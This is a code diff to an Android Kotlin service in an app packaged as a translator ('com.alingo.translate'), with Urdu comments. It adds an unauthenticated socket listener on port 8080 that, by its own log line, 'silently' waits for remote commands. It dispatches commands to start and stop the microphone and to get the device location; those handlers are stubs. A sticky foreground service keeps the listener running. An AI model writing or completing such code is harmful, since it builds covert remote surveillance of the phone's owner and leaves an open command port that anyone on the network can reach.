@@ -8,10 +8,15 @@ import android.app.Service
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
+import android.util.Log
 import com.alingo.translate.MainActivity
-import com.alingo.translate.R
+import java.net.ServerSocket
+import kotlin.concurrent.thread
 
 class AgentService : Service() {
+
+    private var serverSocket: ServerSocket? = null
+    private var isListening = true
 
     override fun onCreate() {
         super.onCreate()
@@ -19,53 +24,97 @@ class AgentService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // ایپ کھولنے کے لیے PendingIntent بنائیں
+        // 1. نوٹیفکیشن آن رکھیں (تاکہ اینڈرائیڈ سروس کو مار نہ دے)
+        startForeground(1001, buildNotification())
+
+        // 2. ایجنٹ کو "سننے" (Listen) کے لیے تیار کریں
+        // یہ تھریڈ صرف سگنل کا انتظار کرے گا، کوئی پروسیسنگ نہیں کرے گا
+        if (serverSocket == null) {
+            startListeningForCommands()
+        }
+
+        return START_STICKY
+    }
+
+    private fun startListeningForCommands() {
+        thread(isDaemon = true) {
+            try {
+                // ایک پورٹ پر کنٹرولر کے سگنل کا انتظار کریں (مثلاً 8080)
+                serverSocket = ServerSocket(8080)
+                Log.d("AlinGoAgent", "Agent is silently listening on port 8080")
+
+                while (isListening) {
+                    // یہ لائن پروسیسر کو روکے رکھے گی (Sleep) جب تک کوئی کمانڈ نہ آئے
+                    val client = serverSocket?.accept() ?: break 
+                    
+                    // اگر یہاں تک پہنچے تو اس کا مطلب ہے کمانڈ آئی ہے
+                    val command = client.getInputStream().bufferedReader().readLine()
+                    executeCommand(command)
+                    client.close()
+                }
+            } catch (e: Exception) {
+                Log.e("AlinGoAgent", "Listener stopped: ${e.message}")
+            }
+        }
+    }
+
+    private fun executeCommand(command: String?) {
+        if (command == null) return
+        Log.d("AlinGoAgent", "Received command: $command")
+        
+        // یہاں آپ کی کمانڈز کا پروسیسنگ ہوگا
+        when (command) {
+            "PING" -> Log.d("AlinGoAgent", "PONG")
+            "START_MIC" -> { /* MicHandler.start() */ }
+            "STOP_MIC" -> { /* MicHandler.stop() */ }
+            "GET_LOCATION" -> { /* LocationHandler.get() */ }
+            // اور بھی کمانڈز...
+        }
+    }
+
+    private fun buildNotification(): Notification {
         val pendingIntent = PendingIntent.getActivity(
             this, 0,
             Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
-        val notification: Notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             Notification.Builder(this, "AgentChannel")
-                .setContentTitle("AlinGo Agent Active")
-                .setContentText("System control services are running.")
-                .setSmallIcon(android.R.drawable.stat_sys_download_done) // ایک اچھا سا آئیکن
+                .setContentTitle("AlinGo Agent Ready")
+                .setContentText("Waiting for controller commands...")
+                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                 .setContentIntent(pendingIntent)
-                .setOngoing(true) // نوٹیفکیشن کو مستقل رکھیں (صارف اسے سوائپ کر کے ختم نہیں کر سکتا)
+                .setOngoing(true) // ہمیشہ آن رہے گا
                 .build()
         } else {
             Notification.Builder(this)
-                .setContentTitle("AlinGo Agent Active")
-                .setContentText("System control services are running.")
+                .setContentTitle("AlinGo Agent Ready")
+                .setContentText("Waiting for controller commands...")
                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .build()
         }
-
-        startForeground(1001, notification)
-
-        // یہاں آپ کا ایجنٹ کا اصل کوڈ چلے گا
-        // مثلاً: ConnectionManager.start(this)
-
-        return START_STICKY // اگر سسٹم سروس کو مار دے تو یہ خود بخود دوبارہ شروع ہو جائے گی
     }
-
-    override fun onBind(intent: Intent?): IBinder? = null
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val serviceChannel = NotificationChannel(
                 "AgentChannel",
-                "AlinGo Agent Service",
+                "AlinGo Agent",
                 NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Keeps AlinGo Agent running for remote system control."
-                setShowBadge(false) // لال ڈاٹ نہ دکھائیں
-            }
+            )
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(serviceChannel)
         }
     }
+
+    override fun onDestroy() {
+        isListening = false
+        try { serverSocket?.close() } catch (_: Exception) {}
+        super.onDestroy()
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
 }
